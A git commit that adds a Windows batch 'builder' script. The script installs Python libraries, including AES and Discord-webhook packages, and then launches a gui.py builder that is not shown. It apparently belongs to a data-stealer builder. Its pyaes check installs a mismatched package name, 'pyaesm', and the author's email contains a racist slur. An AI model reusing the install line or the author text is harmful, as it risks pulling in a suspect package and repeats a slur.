f0b6654982acd77f712a3568a694cc38e3915985
GoTHeartless <iforceblackslavestodoworknigge@gmail.com>
2024-11-23 00:28:30 +0100

    Add files via upload

---
+++ Builder.bat
@@ -0,0 +1,63 @@
+@echo off
+cd /d %~dp0
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
+    echo Make sure it is added to PATH.
+    goto ERROR
+)
+
+title Checking libraries...
+echo Checking 'customtkinter' (1/6)
+python -c "import customtkinter" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing customtkinter...
+    python -m pip install customtkinter > nul
+)
+
+echo Checking 'pillow' (2/6)
+python -c "import PIL" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pillow...
+    python -m pip install pillow > nul
+)
+
+echo Checking 'pyaes' (3/6)
+python -c "import pyaes" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyaes...
+    python -m pip install pyaesm > nul
+)
+
+echo Checking 'urllib3' (4/6)
+python -c "import urllib3" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing urllib3...
+    python -m pip install urllib3 > nul
+)
+
+echo Checking 'requests' (5/6)
+python -c "import requests" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing requests...
+    python -m pip install requests > nul
+)
+
+echo Checking 'discord-webhook' (5/6)
+python -c "import discord-webhook" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing discord-webhook...
+    python -m pip install discord-webhook > nul
+)
+
+cls
+title Starting builder...
+python gui.py
+if %errorlevel% neq 0 goto ERROR
+exit
+
+:ERROR
+color 4 && title [Error]
+pause > nul
